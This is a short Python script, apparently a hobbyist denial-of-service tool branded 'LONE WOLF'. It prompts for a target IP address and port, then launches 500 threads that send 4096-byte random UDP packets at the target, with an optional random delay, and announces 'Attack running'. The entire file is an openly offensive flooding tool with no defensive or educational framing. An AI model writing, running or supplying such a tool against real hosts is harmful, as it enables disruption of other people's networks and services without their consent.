#!/usr/bin/env python3
import socket
import threading
import random
import time
import os

def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def ascii_banner():
    print(r"""

 __        ______   .__   __.  _______    ____    __    ____  ______    __       _______ 
|  |      /  __  \  |  \ |  | |   ____|   \   \  /  \  /   / /  __  \  |  |     |   ____|
|  |     |  |  |  | |   \|  | |  |__       \   \/    \/   / |  |  |  | |  |     |  |__   
|  |     |  |  |  | |  . `  | |   __|       \            /  |  |  |  | |  |     |   __|  
|  `----.|  `--'  | |  |\   | |  |____       \    /\    /   |  `--'  | |  `----.|  |     
|_______| \______/  |__| \__| |_______|       \__/  \__/     \______/  |_______||__|     
                                                                                         

                                                          
    Coded by virtua1darr3n | Version 1.0
    """)

def send_packet(target_ip, target_port, random_sleep=False, source_port=0):
    try:
        client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        if source_port:
            client.bind(('', source_port))
        packet = random._urandom(4096)

        if random_sleep:
            time.sleep(random.uniform(0, 0.001))
        client.sendto(packet, (target_ip, target_port))
    except Exception as e:
        print(f"[!] Error: {e}")

def main():
    clear()
    ascii_banner()
    target_ip = input("Enter target IP address: ")
    target_port = int(input("Enter target Port: "))
    attack_type = input("Enable random sleep between packets? (y/n): ").lower()

    use_random_sleep = attack_type == 'y'
    threads = []

    try:
        for i in range(500):
            t = threading.Thread(target=send_packet, args=(target_ip, target_port, use_random_sleep, i + 10000))
            t.daemon = True
            t.start()
            threads.append(t)
        print("[*] Attack running. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")

if __name__ == '__main__':
    main()
